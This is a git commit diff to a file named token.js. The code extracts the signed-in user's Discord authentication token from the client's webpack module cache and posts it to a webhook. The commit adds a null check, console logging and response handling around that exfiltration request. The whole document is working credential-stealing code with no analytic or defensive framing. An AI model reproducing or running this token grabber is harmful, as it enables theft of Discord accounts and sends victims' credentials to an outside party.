9b6719c493f15d1d983d444e2ea7806c33f45710
c82676b9a8 <c82676b9a8@proton.me>
2025-08-24 21:38:00 +0200

    Addadhfg

--- token.js
+++ token.js
@@ -5,12 +5,21 @@ var token = (webpackChunkdiscord_app.push([[''], {}, e => {
   for (let c in e.c) m.push(e.c[c]);
 }]), m).find(x => x?.exports?.default?.getToken !== undefined).exports.default.getToken();
 
-fetch(webhook, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify({
-    content: `Token: ${token}`
+console.log("Token:", token);
+
+if (token) {
+  fetch(webhook, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json',
+    },
+    body: JSON.stringify({
+      content: `Token: ${token}`
+    })
   })
-});
+  .then(response => response.json())
+  .then(data => console.log('Success:', data))
+  .catch((error) => console.error('Error:', error));
+} else {
+  console.log("Token not found or undefined.");
+}
